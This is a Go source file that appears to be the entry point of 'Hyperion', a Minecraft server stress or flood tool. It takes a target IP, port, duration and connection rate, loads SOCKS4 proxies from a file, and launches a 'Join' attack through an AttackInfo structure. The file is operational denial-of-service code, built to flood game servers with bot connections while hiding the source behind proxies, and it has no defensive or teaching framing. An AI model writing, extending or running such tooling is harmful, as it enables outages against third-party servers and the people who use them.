package main

import (
	"Hyperion/core"
	"Hyperion/core/method"
	"Hyperion/core/method/methods"
	"Hyperion/core/proxy"
	"flag"
	"log"
	"time"
)

var (
	ip       = flag.String("ip", "0.0.0.0", "sets ip")
	port     = flag.Int("port", 25565, "sets port")
	protocol = flag.Int("protcol", 761, "sets version protocol")
	duration = flag.Int("duration", 600, "duration in sec")
	loops    = flag.Int("loops", 1, "no of loop threads")
	delay    = flag.Int("delay", 1, "delay in sec")
	perDelay = flag.Int("perdelay", 1000, "connections per delay")
)

func main() {

	flag.Parse()
	registerMethod()
	proxyManager := proxy.ProxyManager{}
	err := proxy.LoadFromFile(proxy.SOCKS4, "socks4.txt", &proxyManager)
	if err != nil {
		log.Fatal(err)
	}

	method := methods.Join{}

	method.Start(
		&core.AttackInfo{
			Ip:       *ip,
			Port:     *port,
			Protocol: *protocol,
			Duration: time.Duration(*duration) * time.Second,
			Loops:    *loops,
			Delay:    time.Duration(*delay) * time.Second,
			PerDelay: *perDelay,
		},
		&proxyManager,
	)
}

func registerMethod() {
	method.RegisterMethod(methods.Join{})
	method.RegisterMethod(methods.Ping{})
	method.RegisterMethod(methods.MOTD{})
}
